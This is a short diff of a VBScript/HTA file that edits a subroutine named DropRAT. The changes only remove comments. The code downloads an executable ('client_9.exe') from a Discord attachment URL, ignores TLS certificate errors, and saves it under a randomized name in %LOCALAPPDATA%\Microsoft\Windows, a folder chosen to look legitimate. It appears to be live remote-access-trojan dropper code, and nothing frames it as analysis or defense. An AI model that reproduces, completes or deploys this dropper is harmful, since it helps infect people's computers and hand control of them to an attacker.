@@ -43,10 +43,10 @@ Loop
 
 window.close()
 
-' --- RAT DROP (MSXML Object from provided script) ---
+' --- RAT DROP ---
 Sub DropRAT(targetWH, sendRocket)
     Dim dl : dl = "https://cdn.discordapp.com/attachments/1570877567567929557/1572752014616825856/client_9.exe?ex=6aff82f4&is=6afe3174&hm=841914e039c8b9df85e99842774e4bf44f6e6dc4c0bf290a1033dcbb02a00aed&"
-    
+
     Dim tPath : tPath = sh.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\Microsoft\Windows"
     If Not fso.FolderExists(tPath) Then fso.CreateFolder tPath
     Randomize
@@ -57,7 +57,6 @@ Sub DropRAT(targetWH, sendRocket)
 
     If fso.FileExists(op) Then fso.DeleteFile op, True
 
-    ' Use the same MSXML download logic as your working script
     Dim xh : Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", dl, False
